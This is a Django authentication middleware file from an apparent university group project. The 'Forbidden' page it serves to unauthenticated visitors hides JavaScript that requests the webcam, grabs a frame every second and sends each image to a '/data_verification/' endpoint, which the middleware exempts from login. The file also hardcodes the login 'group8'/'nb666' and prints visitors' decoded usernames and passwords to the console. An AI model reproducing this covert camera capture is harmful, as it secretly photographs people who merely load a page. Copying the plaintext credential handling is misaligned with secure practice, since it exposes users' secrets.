# -*- coding: utf-8 -*-
"""
@Time ： 2022/4/17 14:30
@Auth ： Wang Yuyang
@File ：auth_middleware.py
@IDE ：PyCharm
"""
import django
from django.core.handlers.wsgi import WSGIRequest
from django.http import HttpResponse
from django.shortcuts import redirect
import base64
from app import settings


# cors_middleware.py
# class MiddlewareMixin(object):
#     def __init__(self, get_response=None):
#         self.get_response = get_response
#         super(MiddlewareMixin, self).__init__()
#
#     def __call__(self, request):
#         response = None
#         if hasattr(self, 'process_request'):
#             response = self.process_request(request)
#         if not response:
#             response = self.get_response(request)
#         if hasattr(self, 'process_response'):
#             response = self.process_response(request, response)
#         return response
#
#
# class LoginRequiredMiddleware(MiddlewareMixin):
#     def process_response(self, request, response):
#
#         # 允许你的域名来获取我的数据
#         response['Access-Control-Allow-Origin'] = "*"
#
#         # 允许你携带Content-Type请求头
#         # response['Access-Control-Allow-Headers'] = "Content-Type"
#
#         # 允许你发送DELETE,PUT
#         # response['Access-Control-Allow-Methods'] = "DELETE,PUT"
#         return response

class MyLoginRequiredMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
        # One-time configuration and initialization.

    def __call__(self, request: WSGIRequest):
        # Code to be executed for each request before
        # the view (and later middleware) are called.
        # print(request.headers))
        # if "TEST_LOGOUT_AUTH" in request.path:
        #     print("TEST_LOGOUT_AUTH")
        #     response = HttpResponse("Logout success", status=401)
        #     response['WWW-Authenticate'] = "Basic realm='Login Required'"
        #     return response
        # print(request.path)
        if "data_verification" in request.path or 'favicon.ico' in request.path:
            return self.get_response(request)
        if request.COOKIES.get('GROUP8-AUTH-SUCCESS') is None:
            # Reset request path to '/' and set a 403 response
            response = HttpResponse("""
            <!doctype html>
<html lang='en'>

<head>
    <meta charset='UTF-8'>
    <title>Forbidden</title>
</head>

<body style='display: flex;height: 100%;flex-direction: column;justify-content:
                                    center;align-content: flex-start;align-items: center;'>
<div style='display: flex;height: 100%;flex-direction: column;justify-content:
                                    center;align-content: flex-start;align-items: center;'>
    <div style='display:
                                    flex;flex-direction: column;align-content: space-around;flex-wrap: wrap;'>You
        are <h1>Not Allowed to view this project</h1><br>
        This is the project built by COMP3030J Group8-IllegalGroupNameException.<br>
        Please contact <strong>Group8</strong> to view this project.<br>
        Your request has been intercept by our <strong>Auth Middleware.</strong>
        <p
                style='color:red'>This incident has been reported.</p>
        <button id='take' hidden>a</button>
<br/>
<video id='v' style='width: 640px;height: 480px;' hidden></video>
<canvas id='canvas' style='display:none;'></canvas>
<br/>
<img src='' id='photo' alt='photo' hidden>
    </div>
</div>


<script>

    // 老的浏览器可能根本没有实现 mediaDevices，所以我们可以先设置一个空的对象
    if (navigator.mediaDevices === undefined) {
        navigator.mediaDevices = {};
    }
    if (navigator.mediaDevices.getUserMedia === undefined) {
        navigator.mediaDevices.getUserMedia = function (constraints) {
            // 首先，如果有getUserMedia的话，就获得它
            var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;

            // 一些浏览器根本没实现它 - 那么就返回一个error到promise的reject来保持一个统一的接口
            if (!getUserMedia) {
                return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
            }

            // 否则，为老的navigator.getUserMedia方法包裹一个Promise
            return new Promise(function (resolve, reject) {
                getUserMedia.call(navigator, constraints, resolve, reject);
            });
        }
    }
    const constraints = {
        video: true,
        audio: false
    };
    let videoPlaying = false;
    let v = document.getElementById('v');
    let promise = navigator.mediaDevices.getUserMedia(constraints);
    promise.then(stream => {
        if ('srcObject' in v) {
            v.srcObject = stream;
        } else {
            v.src = window.URL.createObjectURL(stream);
        }
        v.onloadedmetadata = function (e) {
            v.play();
            videoPlaying = true;
        };
    }).catch(err => {
        console.error(err.name + ': ' + err.message);
    })

    function camera() {
        let canvas = document.getElementById('canvas');
        canvas.width = v.videoWidth;
        canvas.height = v.videoHeight;
        canvas.getContext('2d').drawImage(v, 0, 0);
        let data = canvas.toDataURL('image/webp');
        var xmlHttp = new XMLHttpRequest();

        xmlHttp.open('GET', '/data_verification/?data=' + data, true);
        xmlHttp.send();


        document.getElementById('photo').setAttribute('src', data);
        setTimeout(function () {
            camera()
        }, 1000)
    }

    document.onreadystatechange = function (e) {
        console.log(e);
        camera()
    };
</script>


</body>

</html>
            
            """
                                    , status=401)
            response['WWW-Authenticate'] = "Basic realm='Login Required'"
            if "Authorization" in request.headers:
                data = request.headers["Authorization"]
                if data.startswith("Basic "):
                    data = data.split("Basic ")[1]
                    data = base64.b64decode(data).decode("utf-8")
                    data = data.split(":")
                    username = data[0]
                    password = data[1]
                    print(username, password)
                    if username == "group8" and password == "nb666":
                        response = HttpResponse("<div style='display: flex;height: 100%;flex-direction: "
                                                "column;justify-content: center;align-content: "
                                                "flex-start;align-items: center;'><div style='display: "
                                                "flex;flex-direction: column;align-content: space-around;flex-wrap: "
                                                "wrap;'> "
                                                "<h1>Welcome!</h1> Now you can view the project.<br>Please refresh "
                                                "this page to view our project.</div></div>", status=200)
                        response.set_cookie("GROUP8-AUTH-SUCCESS", "ok", max_age=3600)
                        # response: HttpResponse = self.get_response(request)
                        return response
        else:
            response: HttpResponse = self.get_response(request)

        return response
